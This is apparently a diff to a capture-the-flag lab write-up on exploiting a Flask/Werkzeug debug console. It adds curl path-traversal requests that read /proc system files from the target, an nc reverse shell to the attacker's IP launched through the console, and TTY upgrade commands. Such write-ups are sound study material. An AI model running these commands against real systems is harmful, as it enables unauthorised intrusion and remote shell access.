@@ -111,22 +111,13 @@ python -c 'print(0x0242ac110007)'
 >[!example]- Result
 >![[Pasted image 20250226193042.png]]
 
-- now we have all pieces to reproduce a PIN code to get access at debug console, first we need to get MAC address (In my case `2485377892359`)
-```bash
-cat /sys/class/net/eth0/address
-python -c 'print(0x0242ac110007)'
-```
->[!example]- Result
->![[Pasted image 20250226172041.png]]
-
 - And get this value `/proc/sys/kernel/random/boot_id` in my case `e9630489-23dd-47bb-b05d-3250757832dc` and u have to append de value of `/proc/self/cgroup` (last slash)
 ```bash
-cat /proc/sys/kernel/random/boot_id
-cat /proc/self/cgroup
+curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length
+curl http://10.10.11.164/uploads/..//proc/self/cgroup --path-as-is --ignore-content-length
 ```
 >[!example]- Result
->![[Pasted image 20250226172348.png]]
->![[Pasted image 20250226175135.png]]
+>![[Pasted image 20250226193812.png]]
 
 - so the final code is this:
 ```python
@@ -236,5 +227,22 @@ os.popen('whoami').read().strip()
 >[!example]- Result
 >![[Pasted image 20250226185729.png]]
 
+- send the revershell
+```python
+import os
+os.popen('nc 10.10.16.5 4444 -e sh').read().strip()
+```
+>[!example]- Result
+>![[Pasted image 20250226194915.png]]
+>![[Pasted image 20250226195224.png]]
 
+- tty sanitization
+```bash
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+ctrl + z
+stty raw echo; fg
+reset xterm
+export PS1="\u@\h:\w\# "
+export TERM=xterm-256color
+```
 # Docker Breakout
